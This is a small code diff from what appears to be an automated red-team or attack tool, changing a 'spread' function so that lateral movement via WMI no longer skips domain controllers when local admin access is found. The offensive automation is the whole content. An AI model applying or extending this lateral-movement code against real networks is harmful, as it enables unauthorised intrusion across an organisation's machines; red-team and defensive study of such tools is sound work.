@@ -539,7 +539,7 @@ def spread(agent_name):
 
             print_info('Starting lateral movement', agent_name)
             if priority_targets:
-                for box in [target for target in priority_targets if target not in domain_controllers]:
+                for box in [target for target in priority_targets]:
                     if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
                         invoke_wmi(agent_name, box)
 
